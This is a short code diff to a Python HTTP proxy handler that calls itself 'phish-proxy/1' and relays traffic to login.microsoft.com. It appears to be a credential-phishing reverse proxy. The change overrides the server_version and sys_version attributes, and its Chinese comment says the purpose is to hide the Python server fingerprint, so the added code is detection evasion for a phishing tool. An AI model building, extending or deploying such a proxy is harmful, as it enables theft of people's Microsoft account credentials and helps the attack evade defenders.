@@ -52,6 +52,11 @@ def add_event(kind, uid, extra=None):  # CS72-4: db 死参删(锁内重读, 调�
     print(f'[proxy] {kind} uid={uid}', flush=True)
 
 class ProxyHandler(BaseHTTPRequestHandler):
+    # R32D90-OBS2: 匿名化自动 Server 头(send_response 注入缺省
+    # BaseHTTP/Python 栈指纹; 类属性覆盖优于手动加头——后者双份)。
+    server_version = 'phish-proxy/1'
+    sys_version = ''
+
     # Class-level config (set by serve())
     target_base = 'https://login.microsoft.com'
 
